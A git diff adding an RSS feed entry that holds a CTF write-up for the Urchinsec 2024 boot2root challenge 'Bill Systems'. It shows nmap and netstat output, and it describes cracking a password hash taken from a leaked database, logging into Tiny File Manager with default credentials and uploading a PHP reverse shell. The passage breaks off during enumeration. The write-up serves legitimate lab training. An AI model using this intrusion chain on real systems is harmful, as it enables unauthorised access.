@@ -6,7 +6,628 @@
         <description>Recent content in ctf writeups on f0rk3b0mb</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 11 Mar 2024 13:23:40 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/categories/writeups/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 28 Apr 2024 13:23:40 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/categories/writeups/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Urchinsec ctf 2024</title>
+        <link>https://f0rk3b0mb.github.io/p/urchinsec-ctf-2024/</link>
+        <pubDate>Sun, 28 Apr 2024 13:23:40 +0300</pubDate>
+        
+        <guid>https://f0rk3b0mb.github.io/p/urchinsec-ctf-2024/</guid>
+        <description>&lt;img src="https://f0rk3b0mb.github.io/cover/urchinsec.png" alt="Featured image of post Urchinsec ctf 2024" /&gt;&lt;h2 id=&#34;writeup-for-urchinsec-2024-boot2root-challenge&#34;&gt;Writeup for urchinsec 2024 boot2root challenge&lt;/h2&gt;
+&lt;p&gt;This is the writeup for the boot 2 root challenge Bill Systems  which i got the second solve.&lt;/p&gt;
+&lt;p&gt;This challneg requires knowledge in:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;recon&lt;/li&gt;
+&lt;li&gt;persistense&lt;/li&gt;
+&lt;li&gt;lateral movement&lt;/li&gt;
+&lt;li&gt;priviledge escalation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;bill-systems&#34;&gt;Bill Systems&lt;/h3&gt;
+&lt;p&gt;categoty: boot2root
+difficulty: medium&lt;/p&gt;
+&lt;p&gt;we are given:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;SCOPE OF ENGAGEMENT
+domains : *.billsys.urc
+IP : 45.79.66.97
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;First we need to gather more info, so i ran an nmap scan to see open ports&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH 9.7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 9e:cd:9e:38:58:35:4c:24:1a:01:29:0d:9d:26:fe:2b (ECDSA)
+|_  256 50:35:25:83:7d:aa:d7:42:43:d4:bb:fa:e8:6c:12:bb (ED25519)
+25/tcp   filtered smtp
+80/tcp   open     http
+|_http-title: Site doesn&amp;#39;t have a title (text/plain; charset=utf-8).
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 27 Apr 2024 12:15:19 GMT
+|     Content-Length: 0
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 27 Apr 2024 12:15:12 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 27 Apr 2024 12:15:13 GMT
+|_    Content-Length: 0
+443/tcp  open     https?
+3000/tcp open     ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=7748aed9b1afa3fe; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=U5NJcsVjX-xLNIhZ6o64wSWiZd86MTcxNDIyMDExMzY5MDg3MDY4Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 27 Apr 2024 12:15:13 GMT
+|     &amp;lt;!DOCTYPE html&amp;gt;
+|     &amp;lt;html lang=&amp;#34;en-US&amp;#34; data-theme=&amp;#34;gitea-auto&amp;#34;&amp;gt;
+|     &amp;lt;head&amp;gt;
+|     &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1&amp;#34;&amp;gt;
+|     &amp;lt;title&amp;gt;Gitea: Git with a cup of tea&amp;lt;/title&amp;gt;
+|     &amp;lt;link rel=&amp;#34;manifest&amp;#34; href=&amp;#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdC5iaWxsc3lzLnVyYy8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdC5iaWxsc3lzLnVyYy9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6ImltYWdlL3BuZyIsInNpem
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=e41496a78b8b88ad; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=vUtLqCC5_VSGwBmhopYmXC6PyWM6MTcxNDIyMDEyMDUyMzg0MjU2Mw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 27 Apr 2024 12:15:20 GMT
+|_    Content-Length: 0
+3306/tcp open     mysql       MariaDB (unauthorized)
+3333/tcp open     nagios-nsca Nagios NSCA
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.94SVN%I=7%D=4/27%Time=662CEC50%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,4B,&amp;#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Apr\x202
+SF:024\x2012:15:12\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;#34;)%r(HTTPOptions,
+SF:4B,&amp;#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Apr\x202024\x2012:
+SF:15:13\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;#34;)%r(RTSPRequest,67,&amp;#34;HTTP/1
+SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
+SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;)%r(FourOhF
+SF:ourRequest,4B,&amp;#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Apr\x20
+SF:2024\x2012:15:19\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;#34;)%r(GenericLine
+SF:s,67,&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
+SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
+SF:&amp;#34;)%r(Help,67,&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
+SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
+SF:0Request&amp;#34;)%r(SSLSessionReq,67,&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
+SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
+SF:\r\n400\x20Bad\x20Request&amp;#34;)%r(TerminalServerCookie,67,&amp;#34;HTTP/1\.1\x20400
+SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
+SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;)%r(TLSSessionReq,67,
+SF:&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
+SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;)%r(
+SF:Kerberos,67,&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request&amp;#34;)%r(LPDString,67,&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
+SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
+SF:00\x20Bad\x20Request&amp;#34;)%r(LDAPSearchReq,67,&amp;#34;HTTP/1\.1\x20400\x20Bad\x20R
+SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
+SF:x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;)%r(SIPOptions,67,&amp;#34;HTTP/1\.1\x204
+SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
+SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&amp;#34;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port3000-TCP:V=7.94SVN%I=7%D=4/27%Time=662CEC51%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request&amp;#34;)%r(GetRequest,38A1,&amp;#34;HTTP/1\.0\x20200\x20OK\r\nCache-Contr
+SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
+SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
+SF:ea=7748aed9b1afa3fe;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
+SF:kie:\x20_csrf=U5NJcsVjX-xLNIhZ6o64wSWiZd86MTcxNDIyMDExMzY5MDg3MDY4Nw;\x
+SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2027\x20Apr\x202024\x2012:15:13\x
+SF:20GMT\r\n\r\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html\x20lang=\&amp;#34;en-US\&amp;#34;\x20data-theme=
+SF:\&amp;#34;gitea-auto\&amp;#34;&amp;gt;\n&amp;lt;head&amp;gt;\n\t&amp;lt;meta\x20name=\&amp;#34;viewport\&amp;#34;\x20content=\&amp;#34;widt
+SF:h=device-width,\x20initial-scale=1\&amp;#34;&amp;gt;\n\t&amp;lt;title&amp;gt;Gitea:\x20Git\x20with\x
+SF:20a\x20cup\x20of\x20tea&amp;lt;/title&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;#34;manifest\&amp;#34;\x20href=\&amp;#34;
+SF:data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG
+SF:9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic
+SF:3RhcnRfdXJsIjoiaHR0cDovL2dpdC5iaWxsc3lzLnVyYy8iLCJpY29ucyI6W3sic3JjIjoi
+SF:aHR0cDovL2dpdC5iaWxsc3lzLnVyYy9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6Iml
+SF:tYWdlL3BuZyIsInNpem&amp;#34;)%r(Help,67,&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\n
+SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
+SF:\n\r\n400\x20Bad\x20Request&amp;#34;)%r(HTTPOptions,197,&amp;#34;HTTP/1\.0\x20405\x20Me
+SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
+SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
+SF:et-Cookie:\x20i_like_gitea=e41496a78b8b88ad;\x20Path=/;\x20HttpOnly;\x2
+SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=vUtLqCC5_VSGwBmhopYmXC6PyWM6MTcxN
+SF:DIyMDEyMDUyMzg0MjU2Mw;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
+SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2027\x20A
+SF:pr\x202024\x2012:15:20\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;#34;)%r(RTSPR
+SF:equest,67,&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+SF:quest&amp;#34;);
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Only ports of interest were 22, 25 , 80 , 3306&lt;/p&gt;
+&lt;p&gt;on port 80 is bills portfolio other than that there is nothing interesting&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;portfoilio&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;so we try and get the subdomains:&lt;/p&gt;
+&lt;p&gt;There are two subdomains :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;git.billsys.urc  - this is running a local instance of gittea&lt;/li&gt;
+&lt;li&gt;storage.billsys.urc - this is running am instance of tiny file manager&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;On git.billsys.urc  we create an account and login. There are other users and repos but the one that sticks out is that of bill.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/urchinsec/gittea.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;gittea&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;It is source code for a python web app called sesame.&lt;/p&gt;
+&lt;p&gt;Looking at the commits we see a sqllite instance database that had been ommited we download it and view contents&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/urchinsec/keys.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;keys&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/urchinsec/users.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;users&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;cracking the user hash we get the password&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f : password123
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;hr&gt;
+&lt;p&gt;On storage.billsys.urc we are provided with an instance of tiny file manager we also require creds to access it. It used defauld creds for tiny file manager.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;admin : admin@123
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Here we can upload files , so i upload a php rev shell&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Dropping to the shell we see that we are user &amp;ldquo;http&amp;rdquo;. There is no obvious method of priv esc.&lt;/p&gt;
+&lt;p&gt;I was stuck here till i checked the open ports on the machine using netstat.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
